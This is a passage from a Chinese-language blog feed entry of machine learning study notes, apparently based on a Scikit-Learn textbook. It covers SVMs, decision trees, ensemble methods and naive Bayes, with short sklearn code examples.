alt="image-20210423214542324"></p><p><u><em><strong>软间隔分类：</strong></em></u></p><p>如果严格地让所有实例都不在”街道“上，并且位于正确的一边，这就是硬间隔分类。硬间隔分类有2个问题：一个是它只在数据线性可分离时才有效；一个是对异常值特别敏感（会影响泛化能力）。</p><p>为了避免以上问题，灵活地使用模型，我们尽可能在保持街道宽阔和限制间隔违例（即位于街道之上，甚至在错误的一边的实例）之间找到良好的平衡，这就是软间隔分类。在Scikit-Learn的SVM类中，可以通过超参数C来控制这个平衡：C值越小，则街道越宽，但是间隔违例也会越多。</p><p>如果你的SVM模型过度拟合，可以试试通过降低C来进行正则化。</p><p><u><em><strong>SMO算法：</strong></em></u></p><p>在求解SVM的决策边界（求解参数）时，会遇到规模正比于训练样本数量的问题，为了避开这个障碍，使用SMO算法来求解其中的参数。</p><p>SMO的思想：</p><p>每次选择2个变量，然后固定其他变量（参数），然后优化选择的这2个变量，因为每次只优化2个变量，所以非常高效。</p><p><u><em><strong>使用：</strong></em></u></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/20181206003046683.png" alt="img"></p><p><strong>LinearSVC类</strong>适用于<u>样本数量较多</u>的二元和多元分类（大于10000），它会对偏置项进行正则化，所以你需要先减去平均值，使训练集集中（归一化）。如果使用StandardScaler会自动进行这一步。此外，请确保超参数loss设置为”hinge”，因为它不是默认值。最后，为了获得更好的性能，还应该将超参数dual设置为False，除非特征数量比训练实例还多。可以使用管道技术将归一化和实例化算法统一起来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> LinearSVC</span><br><span class="line">svm_clf = LinearSVC(C=<span class="number">1</span>, loss=<span class="string">&quot;hinge&quot;</span>, dual=<span class="literal">False</span>, random_state=<span class="number">42</span>)</span><br><span class="line"><span class="comment"># C越大，越接近硬间隔；使用hinge损失函数，随机种子为42</span></span><br><span class="line"><span class="comment"># svm_clf = Pipeline([(&quot;scaler&quot;, StandardScaler()), (&quot;linear_svc&quot;, LinearSVC(C=1, loss=&quot;hinge&quot;, random_state=42)), ])</span></span><br></pre></td></tr></table></figure><p><strong>SVC类</strong>可以使用核函数（后面会讲到），适用于<u>样本数量较少</u>的二元和多元分类（少于10000）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line">svm_clf = SVC(kernel=<span class="string">&quot;linear&quot;</span>, C=<span class="number">1</span>)   <span class="comment"># 使用线性核函数</span></span><br></pre></td></tr></table></figure><p><strong>SGDClassifier类</strong>它不会像LinearSVC类那样快速收敛，但是对于内存处理不了的大型数据集（核外训练）或是在线分类任务，它非常有效。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> SGDClassifier</span><br><span class="line"><span class="comment"># SGD模型，使用hinge损失函数，alpha为正则化项参数</span></span><br><span class="line">svm_clf = SGDClassifier(loss=<span class="string">&quot;hinge&quot;</span>, alpha=<span class="number">1</span>/(m*C))</span><br></pre></td></tr></table></figure><h4 id="2-非线性SVM分类"><a href="#2-非线性SVM分类" class="headerlink" title="2. 非线性SVM分类"></a>2. 非线性SVM分类</h4><p>有些情况下，数据集无法直接做到线性可分，解决方法之一就是添加更多的特征，将原始数据映射到更高维的空间，使其变得线性可分。</p><p><u><em><strong>核函数：</strong></em></u></p><p>添加特征会使得在高维空间计算样本特征内积变得困难，为了避开这个障碍，可以设想一个函数，使样本在高维特征空间的内积等于它们在原始样本空间中通过该函数计算的结果。使用该函数的就可以替代在高维甚至无穷维特征空间中的内积。这个函数就叫做”核函数“。</p><p><strong>线性核：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svm_clf = SVC(kernel=<span class="string">&quot;linear&quot;</span>, C=<span class="number">1</span>)    <span class="comment"># SVC模型，使用线性核函数</span></span><br></pre></td></tr></table></figure><p><strong>多项式核：</strong></p><p>为了将数据集映射到高维特征空间，可以使用PolynomialFeatures转换器直接添加多项式特征。但问题是，如果多项式太低阶，处理不了非常复杂的数据集，而高阶则会创造出大量的特征，导致模型变得太慢。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">polynomial_svm_clf = Pipeline([(<span class="string">&quot;poly_features&quot;</span>, PolynomialFeatures(degree=<span class="number">3</span>)), (<span class="string">&quot;scaler&quot;</span>, StandardScaler()), (<span class="string">&quot;svm_clf&quot;</span>, LinearSVC(C=<span class="number">10</span>, loss=<span class="string">&quot;hinge&quot;</span>, random_state=<span class="number">42</span>))])</span><br></pre></td></tr></table></figure><p>为了解决这个问题，出现了多项式核函数。下面这段代码使用了一个3阶多项式内核训练SVM分类器。超参数coef0控制的是模型受高阶多项式还是低阶多项式影响的程度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poly_kernel_svm_clf = Pipeline([(<span class="string">&quot;scaler&quot;</span>, StandardScaler()), (<span class="string">&quot;svm_clf&quot;</span>, SVC(kernel=<span class="string">&quot;poly&quot;</span>, degree=<span class="number">3</span>, coef0=<span class="number">1</span>, C=<span class="number">5</span>))])</span><br><span class="line">poly_kernel_svm_clf.fit(X, y)</span><br></pre></td></tr></table></figure><p><strong>高斯核：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用RBF高斯核函数</span></span><br><span class="line">rbf_kernel_svm_clf = Pipeline([(<span class="string">&quot;scaler&quot;</span>, StandardScaler()),(<span class="string">&quot;svm_clf&quot;</span>, SVC(kernel=<span class="string">&quot;rbf&quot;</span>, gamma=<span class="number">5</span>, C=<span class="number">0.001</span>))])</span><br><span class="line">rbf_kernel_svm_clf.fit(X, y)</span><br></pre></td></tr></table></figure><p>另外，还有拉普拉斯核、Sigmoid核。</p><p><strong><u><em>如何选择核函数：</em></u></strong></p><p>有一个经验法则是，永远先<u>从线性核函数开始</u>尝试（要记住，LinearSVC比SVC（kernel&#x3D;”linear”）快得多），特别是训练集非常大或特征非常多的时候。如果训练集不太大，你可以试试<u>高斯RBF核</u>，大多数情况下它都非常好用。如果你还有多余的时间和计算能力，你可以使用<u>交叉验证和网格搜索</u>来尝试一些其他的核函数，特别是那些专门针对你的数据集数据结构的核函数。</p><h4 id="3-SVM回归-SVR"><a href="#3-SVM回归-SVR" class="headerlink" title="3. SVM回归(SVR)"></a>3. SVM回归(SVR)</h4><p>SVM算法非常全面：它不仅支持线性和非线性分类，而且还支持线性和非线性回归。SVM回归要做的是让尽可能多的实例位于街道上，同时限制间隔违例（也就是不在街道上的实例）。</p><p>街道的宽度由超参数ε控制。在间隔内添加更多的实例不会影响模型的预测，所以这个模型被<br>称为ε不敏感。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427095934141.png" alt="image-20210427095934141" style="zoom: 80%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SVM回归</span></span><br><span class="line">svm_reg = LinearSVR(epsilon=<span class="number">1.5</span>)</span><br><span class="line">svm_reg.fit(X, y)</span><br></pre></td></tr></table></figure><p>要解决非线性回归任务，可以使用核化的SVM模型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用核化的SVM模型进行回归</span></span><br><span class="line">svm_poly_reg = SVR(kernel=<span class="string">&quot;poly&quot;</span>, degree=<span class="number">2</span>, C=<span class="number">100</span>, epsilon=<span class="number">0.1</span>)</span><br><span class="line">svm_poly_reg.fit(X, y)</span><br></pre></td></tr></table></figure><h2 id="第四章-决策树DT"><a href="#第四章-决策树DT" class="headerlink" title="第四章 决策树DT"></a>第四章 决策树DT</h2><p>决策树是一种由结点和有向边构成的树形结构，结点类型分为内部结点和叶结点，每个内部结点代表对象的一个特征，叶结点则代表对象的类别。决策树中，每一个深度就是一次根据某一特征做出的判断。决策树的特质之一就是它们需要的数据准备工作非常少。特别是，完全不需要进行特征缩放或集中。</p><p>鸢尾花决策树：</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210430093007719.png" alt="image-20210430093007719" style="zoom: 80%;"><p>节点的samples属性统计它应用的训练实例数量（满足该节点属性的实例数量），value属性说明了该节点上每个类别的训练实例数量，gini属性衡量其不纯度（impurity，基尼不纯度）：如果应用的所有训练实例都属于同一个类别，那么节点就是“纯”的（gini&#x3D;0）。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423150650767.png" alt="image-20210423150650767" style="zoom: 50%;"><p>$P_{i,k}$是第$i$个节点上，类别为$k$的训练实例占比。</p><p>Scikit-Learn使用的是CART算法（Classification And Regression Tree），该算法仅生成二叉树，可用于分类和回归，使用：基尼不纯度来划分属性。但是，其他算法，比如ID3生成的决策树，其节点可以拥有两个以上的子节点，使用信息增益来划分属性。</p><h3 id="一、CART算法"><a href="#一、CART算法" class="headerlink" title="一、CART算法"></a>一、CART算法</h3><h4 id="1-CART算法（分类）"><a href="#1-CART算法（分类）" class="headerlink" title="1. CART算法（分类）"></a>1. CART算法（分类）</h4><p><strong><u><em>过程如下：</em></u></strong></p><p>（1）使用单个特征k和阈值tk（例如，花瓣长度≤2.45厘米）将训练集分成两个子集。k和tk就是使得成本函数$J$最小化（或者信息增益最大化）的$(k,t_k)$，成本函数衡量划分后的子集的不纯度。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423150441237.png" alt="image-20210423150441237" style="zoom:50%;"><p>（2）一旦成功将训练集一分为二，它将使用相同的逻辑，继续分裂子集，然后是子集的子集，依次循环递进。</p><p>（3）抵达最大深度（由超参数max_depth控制），或是再也找不到能够降低不纯度的分裂时，停止。</p><p>明显，决策树的思想是一种贪心选择，它并不会检视一次分裂的不纯度是否为可能的最低值，这样通常可以产生一个相当不错的解，但是不能保证是最优解。而寻找最优树是一个NP完全问题，即使训练集很小时间复杂度也很高，很难解决，所以我们必须接受这个”相当不错“的解。</p><p><em><strong><u>计算复杂度：</u></strong></em></p><p>决策树总体预测复杂度是O(log2(m))，m为实例数量，可以看出复杂度与特征数量无关，所以即便是处理大型数据集，预测也很快。</p><p>但是，训练时在每一个节点，算法都需要在所有样本上比较所有特征（如果设置了划分时考虑的最大特征数<strong>max_features</strong>会少一些）。这导致训练的复杂度为O(n×m log(m))，。对于小型训练集（几千个实例以内），Scikit-Learn可以通过对数据预处理（设置<strong>presort&#x3D;True</strong>表示对样本进行预排序）来加快训练，但是对于较大训练集而言，可能会减慢训练的速度。</p><p><strong><u><em>过拟合与正则化超参数：</em></u></strong></p><p>决策树在训练时不会确定参数的数量（树的深度不确定），也叫非参数模型，这会导致模型结构自由而紧密地贴近数据，很可能过拟合。而比如线性回归有预先设定好一部分参数，所以其自由度受限，降低过拟合的风险（但是相应的也增加了拟合不足的风险）。</p><p>为了避免过拟合，需要在训练中降低决策树的自由度，即正则化。正则化超参数的选择取决于使用的模型，但是通常至少可以限制决策树的深度。在Scikit-Learn中，这由超参数<strong>max_depth</strong>控制（默认值为None，意味着无限制）。减小max_depth可使模型正则化，从而降低过度拟合的风险。另外，DecisionTreeClassifier类还有一些其他的参数也可以限制决策树的形状，比如<strong>min_samples_split</strong>（分裂前节点必须有的最小样本<br>数），<strong>min_samples_leaf</strong>（叶节点必须有的最小样本数量）等。</p><p>还可以先不加约束地训练模型，然后再对不必要的节点进行剪枝（删除），比如一个节点的子节点全部为叶节点，则该节点可被认为不必要，删除；比如χ2测试，是用来估算“提升纯粹是出于偶然”（被称为虚假设）的概率。如果这个概率（称之为p值）高于一个给定阈值（通常是5%，由超参数控制），那么这个节点可被认为不必要，其子节点可被删除。</p><h4 id="2-CART算法（回归）"><a href="#2-CART算法（回归）" class="headerlink" title="2. CART算法（回归）"></a>2. CART算法（回归）</h4><p>决策树也可以用来完成回归任务，用Scikit_Learn的DecisionTreeRegressor来构建一个回归树。</p><p>与分类决策树的主要差别在于，每个节点上不再是预测一个类别而是预测一个值。预测结果就是与最后到达的叶节点关联的110个实例的平均目标值。MSE表示在这个叶节点上得到的预测结果的均方误差。</p><p>回归任务中，CART算法的工作原理跟前面介绍的大致相同，唯一不同在于，它分裂训练集的方式不是最小化不纯度，而是最小化MSE。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423192435313.png" alt="image-20210423192435313"></p><p>同样，用于回归的决策树也会有过拟合的可能，所以需要设置min_samples_leaf。</p><h4 id="3-优缺点"><a href="#3-优缺点" class="headerlink" title="3. 优缺点"></a>3. 优缺点</h4><p>决策树使用简单，不受特征数量的限制，但是青睐正交的决策边界（所有的分裂都与轴线垂直），这导致它们对训练集的旋转非常敏感，可能导致泛化不佳，限制这种问题的方法之一是使用PCA，让训练数据定位在一个更好的方向上。更概括地说，决策树的主要问题是它们对训练数据中的小变化非常敏感。</p><h3 id="二、ID3算法"><a href="#二、ID3算法" class="headerlink" title="二、ID3算法"></a>二、ID3算法</h3><h3 id="三、C4-5算法（J48）"><a href="#三、C4-5算法（J48）" class="headerlink" title="三、C4.5算法（J48）"></a>三、C4.5算法（J48）</h3><p>使用信息增益选择特征</p><h2 id="第五章-集成学习与随机森林"><a href="#第五章-集成学习与随机森林" class="headerlink" title="第五章 集成学习与随机森林"></a>第五章 集成学习与随机森林</h2><h3 id="一、模型融合"><a href="#一、模型融合" class="headerlink" title="一、模型融合"></a>一、模型融合</h3><h4 id="1-投票分类器"><a href="#1-投票分类器" class="headerlink" title="1. 投票分类器"></a>1. 投票分类器</h4><p>不同的算法在相同训练集上进行训练，得到多个预测模型，然后基于多个模型的预测结果投票选出最终结果。</p><p><strong><u><em>硬投票法：</em></u></strong></p><p>直接让各个预测模型给出预测结果（投票），然后选择大多数模型投票的类别作为最终预测结果。</p><p><strong><u><em>软投票法：</em></u></strong></p><p>模型估算出类别的概率（predict_proba()），将概率在所有单个分类器上（加权）平均，选出平均概率最高的类别进行预测。软投票法比硬投票的表现更优，因为它基于哪些高度自信的投票更高的权重。</p><h4 id="2-bagging-和-pasting"><a href="#2-bagging-和-pasting" class="headerlink" title="2. bagging 和 pasting"></a>2. bagging 和 pasting</h4><p>对训练集随机采样，使用相同的算法在不同的训练子集上进行训练。采样时如果<u>将样本放回</u>，这种方法叫<u>bagging</u>，<u>不放回叫pasting</u>。（bootstrap&#x3D;True表示bagging，否则表示pasting）</p><p>一旦预测器训练完成，集成就可以通过简单地聚合所有预测器的预测，来对新实例做出预测。聚合函数通常是统计法（即最多数的预测好比硬投票分类器一样）用于分类，或是平均法用于回归。最终结果是，与直接在原始训练集上训练的单个预测器相比，集成方法的单个预测器的偏差更大，但是最终结果的偏差相近，方差更低。</p><p><strong><u><em>包外评估：</em></u></strong></p><p>使用bagging时，有些样本可能会被多次采样，有些样本可能不会被采样。不划分单独的测试集，而直接将那些未被采样的样本作为测试集，就是包外评估。</p><h4 id="3-stacking"><a href="#3-stacking" class="headerlink" title="3. stacking"></a>3. stacking</h4><p>第一层：将数据分为训练集和测试集，训练集再分为2个子集。首先在子集1上训练不同的模型：</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428160136685.png" alt="image-20210428160136685" style="zoom: 67%;"><p>第二层：分别使用前面训练好的几个模型对子集2进行预测，得到多个预测值。接着，使用这些预测值作为输入特征，创建一个新的训练集，并保留真实标签。在这个新的训练集上训练混合器，让它学习根据第一层的预测来在测试集上预测目标值。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428160307753.png" alt="image-20210428160307753"></p><p>当然，这个模型还可以增加层数，增加的层都是使用上一层的预测值作为输入特征来训练模型。</p><p>比如下面是一个三层的stacking模型：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428160815773.png" alt="image-20210428160815773"></p><p>将训练集分为3个子集。第一层使用子集1进行模型的训练，得到3个模型。第二层中，使用第一层的模型在子集2上的预测作为输入特征来训练三个新的模型。第三层中，使用第二层的模型在子集3上的预测作为输入特征来训练最终模型。最后使用最终模型在测试集上进行预测。</p><p>不幸的是，Scikit-Learn不直接支持堆叠，但是自己堆出stacking的实现并不太难。或者也可以使用开源的实现方案，例如brew（可从<a href="https://github.com/viisar/brew%E8%8E%B7%E5%BE%97%EF%BC%89%E3%80%82">https://github.com/viisar/brew获得）。</a></p><h3 id="二、随机森林RF"><a href="#二、随机森林RF" class="headerlink" title="二、随机森林RF"></a>二、随机森林RF</h3><p>随机森林就是决策树的集成，通常采用bagging集成方法（有时也可以是pasting）。</p><p>训练子集的大小通过max_samples来设置。在sklearn中，除了先构建一个BaggingClassifier然后将结果传输到DecisionTreeClassifier，还有一种方法就是直接使用RandomForestClassifier或者RandomForestRegressor类。</p><p>随机森林在树的生长上引入了更多的随机性：分裂节点时不再是搜索最好的特征，而是在一个随机生成的特征子集里搜索最好的特征。这导致决策树具有更大的多样性，用更高的偏差换取更低的方差，总之，还是产生了一个整体性能更优的模型。</p><h3 id="三、提升法boosting"><a href="#三、提升法boosting" class="headerlink" title="三、提升法boosting"></a>三、提升法boosting</h3><p>提升法（Boosting，最初被称为假设提升）是指可以将几个弱学习器结合成一个强学习器的任意集成方法。大多数提升法的总体思路是<u>循环训练预测器</u>，每一次都对其前序做出一些改正。</p><h4 id="1-AdaBoost"><a href="#1-AdaBoost" class="headerlink" title="1. AdaBoost"></a>1. AdaBoost</h4><p>新预测器对其前序进行纠正的办法之一，就是更多地关注前序拟合不足的训练实例。从而使新的预测器不断地越来越专注于难缠的问题，这就是AdaBoost使用的技术。</p><p><u><em><strong>过程如下：</strong></em></u></p><p>（1）训练一个基础分类器（比如决策树），用它对训练集进行预测。</p><p>（2）然后对错误分类的训练实例增加其相对权重</p><p>（3）使用这个最新的权重对第二个分类器进行训练，然后再次对训练集进行预测</p><p>（4）继续对错误分类的训练实例增加其权重，如此循环</p><p>（5）当到达所需数量的预测器，或得到完美的预测器时，算法停止</p><p>（6）这样就得到若干个预测器，再使用bagging或pasting等集成方法得到最终预测结果</p><p><u><em><strong>优缺点：</strong></em></u></p><p>AdaBoost不再是调整单个预测器的参数使损失函数最小化，而是不断在集成中加入预测器，使模型越来越好。而且每次训练是基于加权的训练集。</p><p>这种依序学习技术有一个重要的缺陷就是无法并行（哪怕只是一部分），因为每个预测器只能在前一个预测器训练完成并评估之后才能开始训练，在这一点上AdaBoost的表现不及bagging和pasting方法。</p><p><u><em><strong>权重：</strong></em></u></p><p>AdaBoost中，每个预测器有一个权重，通过其加权误差率、学习率计算而来，预测器的准确率越高，其权重就越高。同时，每个样本实例也有权重。最开始每个实例的权重都一样，一个预测器预测完成后，会对实例的权重进行更新，也就是提升被错误分类的实例的权重。</p><p><u><em><strong>使用：</strong></em></u></p><p>Scikit-Learn使用的其实是AdaBoost的一个多分类版本，叫作SAMME（<a href="http://goo.gl/Eji2vR%EF%BC%89[4]%EF%BC%88%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%B1%BB%E6%8C%87%E6%95%B0%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E7%9A%84%E9%80%90%E6%AD%A5%E6%B7%BB%E5%8A%A0%E6%A8%A1%E5%9E%8B%EF%BC%89%E3%80%82%E5%BD%93%E5%8F%AA%E6%9C%89%E4%B8%A4%E4%B8%AA%E7%B1%BB%E5%88%AB%E6%97%B6%EF%BC%8CSAMME%E5%8D%B3%E7%AD%89%E5%90%8C%E4%BA%8EAdaBoost%E3%80%82%E6%AD%A4%E5%A4%96%EF%BC%8C%E5%A6%82%E6%9E%9C%E9%A2%84%E6%B5%8B%E5%99%A8%E5%8F%AF%E4%BB%A5%E4%BC%B0%E7%AE%97%E7%B1%BB%E5%88%AB%E6%A6%82%E7%8E%87%EF%BC%88%E5%8D%B3%E5%85%B7%E6%9C%89predict_proba%EF%BC%88%EF%BC%89%E6%96%B9%E6%B3%95%EF%BC%89%EF%BC%8CScikit-Learn%E4%BC%9A%E4%BD%BF%E7%94%A8%E4%B8%80%E7%A7%8DSAMME%E7%9A%84%E5%8F%98%E4%BD%93%EF%BC%8C%E7%A7%B0%E4%B8%BASAMME.R%EF%BC%88R%E4%BB%A3%E8%A1%A8">http://goo.gl/Eji2vR）[4]（基于多类指数损失函数的逐步添加模型）。当只有两个类别时，SAMME即等同于AdaBoost。此外，如果预测器可以估算类别概率（即具有predict_proba（）方法），Scikit-Learn会使用一种SAMME的变体，称为SAMME.R（R代表</a> “Real”,它依赖的是类别概率而不是类别预测，通常表现更好。</p><h4 id="2-梯度提升"><a href="#2-梯度提升" class="headerlink" title="2. 梯度提升"></a>2. 梯度提升</h4><p>GBDT</p><h3 id="四、XGBoost"><a href="#四、XGBoost" class="headerlink" title="四、XGBoost"></a>四、XGBoost</h3><h2 id="第六章-贝叶斯分类器"><a href="#第六章-贝叶斯分类器" class="headerlink" title="第六章 贝叶斯分类器"></a>第六章 贝叶斯分类器</h2><p>贝叶斯分类是一类分类算法的总称，这类算法均以贝叶斯定理为基础，故统称为贝叶斯分类。而朴素朴素贝叶斯分类是贝叶斯分类中最简单，也是常见的一种分类方法。</p><h3 id="一、贝叶斯公式："><a href="#一、贝叶斯公式：" class="headerlink" title="一、贝叶斯公式："></a>一、贝叶斯公式：</h3><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428101924523.png" alt="image-20210428101924523"></p><p><u><em><strong>原理：</strong></em></u></p><p>X：特征向量；Y：类别<br><strong>先验概率</strong>P(X)：指根据以往经验和分析得到的概率。<br><strong>后验概率</strong>P(Y|X)：事情已经发生，要求这件事情发生的原因是由某个因素引起的可能性的大小。<br><strong>类条件概率</strong>P(X|Y)：在已知某类别的特征空间中，出现特征值X的概率密度。</p><p>如果需要选出某样本属于哪类，则需要根据该条样本求出它属于每个类的概率，选择最大概率的那个类作为分类结果。</p><p>由于结果的产生是比较属于各个类别的概率，所以计算的概率的分母都是P(X)，可以忽略掉P(X)。同时P(Y)容易求出，那么我们关注P(X|Y)。朴素贝叶斯之所以朴素是因为它<u>假设X的每个特征都是独立的</u>，回归原始。故而P(X|Y)的概率就可以计算为：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428102705885.png" alt="image-20210428102705885"></p><p>故，朴素贝叶斯公式：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428102729512.png" alt="image-20210428102729512"></p><h3 id="二、朴素贝叶斯模型："><a href="#二、朴素贝叶斯模型：" class="headerlink" title="二、朴素贝叶斯模型："></a>二、朴素贝叶斯模型：</h3><h4 id="1-多项式模型："><a href="#1-多项式模型：" class="headerlink" title="1. 多项式模型："></a>1. 多项式模型：</h4><p>多项式模型在计算先验概率P(Yk)和条件概率P(xi|Yk)时，会做一些平滑处理，具体公式为：<br>$$<br>P(Y_k) &#x3D; \frac{N_{Y_k}+\alpha}{N+K\alpha}<br>$$</p><p>$N_{Y_k}$：类别为$Y_k$的样本数</p><p>N：总样本数</p><p>K：总的类别个数</p><p>$\alpha$：平滑值</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428110956018.png" alt="image-20210428110956018"></p><p>$N_{Y_k,x_i}$：类别为$Y_k$，且特征为$x_i$的样本数</p><p>n：特征$x_i$可以选择的数量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多项式朴素贝叶斯，alpha为平滑参数，默认为1</span></span><br><span class="line"><span class="comment"># class_prior为类先验概率，若指定了该参数，就按指定的参数计算。class_log_prior_取值就是class_prior转换成log后的结果（防止下溢出）</span></span><br><span class="line"><span class="comment"># fit_prior默认为True，表示是否学习先验概率，为False时表示所有类标记具有相同的先验概率（等于类标记总个数N分之一）</span></span><br><span class="line">pnb_clf = MultinomialNB(alpha=<span class="number">2.0</span>, class_prior=<span class="literal">None</span>, fit_prior=<span class="literal">True</span>)</span><br><span class="line">pnb_clf.fit(X,y)</span><br><span class="line"><span class="built_in">print</span>(pnb_clf.predict([[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>]]))</span><br></pre></td></tr></table></figure><h4 id="2-高斯模型："><a href="#2-高斯模型：" class="headerlink" title="2. 高斯模型："></a>2. 高斯模型：</h4><p>当特征是连续变量的时候，假设特征分布为正太分布，根据样本算出均值和方差，再求得概率。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428111749260.png" alt="image-20210428111749260"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 高斯朴素贝叶斯</span></span><br><span class="line"><span class="comment"># 参数priors默认为None，指各个类标记对应的先验概率</span></span><br><span class="line">gnb_clf = GaussianNB()</span><br><span class="line">gnb_clf.fit(X,y)    <span class="comment"># partial_fit表示增量学习</span></span><br><span class="line"><span class="built_in">print</span>(gnb_clf.predict([[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>]]))</span><br></pre></td></tr></table></figure><h4 id="3-伯努利模型："><a href="#3-伯努利模型：" class="headerlink" title="3. 伯努利模型："></a>3. 伯努利模型：</h4><p>伯努利模型适用于离散特征的情况，每个特征的取值只能是1和0。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428111837792.png" alt="image-20210428111837792"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 伯努利朴素贝叶斯（每个特征的取值只能是1和0）</span></span><br><span class="line"><span class="comment"># 参数binarize指将数据特征二值化的阈值</span></span><br><span class="line">bnb_clf = BernoulliNB(alpha=<span class="number">2.0</span>,binarize = <span class="number">3.0</span>,fit_prior=<span class="literal">True</span>)</span><br><span class="line">bnb_clf.fit(X,y)</span><br><span class="line"><span class="built_in">print</span>(bnb_clf.predict([[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>]]))</span><br></pre></td></tr></table></figure><p><u><em><strong>算法流程：</strong></em></u></p><ol><li><p>处理数据，得到m个具有n个特征的样本，这些样本分别属于${Y_1,Y_2,Y_3}$类别。</p></li><li><p>通过数据分析可以得到每个特征的类条件概率$P(x_i|Y)$，再通过全概率公式求得$P(X)$。</p></li></ol><p>  $P(X)&#x3D;P(X|Y_1)P(Y_1)+P(X|Y_2)P(Y_2)+P(X|Y_3)P(Y_3)$</p><ol start="3"><li><p>其中$P(X|Y_i)$可根据特征独立性展开。</p></li><li><p>将求得的先验概率和类条件概率带入朴素贝叶斯公式，求得每个类别的后验概率。我们可以选择概率最大的类别为最后确定的类别.</p></li></ol><h2 id="第七章-神经网络"><a href="#第七章-神经网络" class="headerlink" title="第七章 神经网络"></a>第七章 神经网络</h2><h2 id="第八章-聚类"><a href="#第八章-聚类" class="headerlink" title="第八章 聚类"></a>第八章 聚类</h2><p>K-means</p><h1 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h1><p>《机器学习实战》目录：</p><p>1~7为分类算法，8~9为回归算法，10~12为无监督算法</p><ol><li>ML基础</li><li>KNN</li><li>DT</li><li>NB（概率分布）</li><li>LR（算法优化，处理数据集合中的缺失值）</li><li>SVM</li><li>AdaBoost</li><li>回归、去噪、局部线性回归</li><li>CART（回归部分）</li><li>k-means</li><li>Apriori</li><li>FP-Growth</li><li><ol start="14"><li>主成分分析、奇异值分解、MapReduce</li></ol></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;机器学习实战&quot;&gt;&lt;a href=&quot;#机器学习实战&quot; class=&quot;headerlink&quot; title=&quot;机器学习实战&quot;&gt;&lt;/a&gt;机器学习实战&lt;/h1&gt;&lt;p&gt;参考书目：&lt;/p&gt;
&lt;p&gt;《机器学习实战：基于Scikit-Learn和TensorFlow》&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="机器学习" scheme="https://frankcao3.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>STL</title>
    <link href="https://frankcao3.github.io/posts/9423"/>
    <id>https://frankcao3.github.io/posts/9423</id>
    <published>2021-08-14T16:00:00.000Z</published>
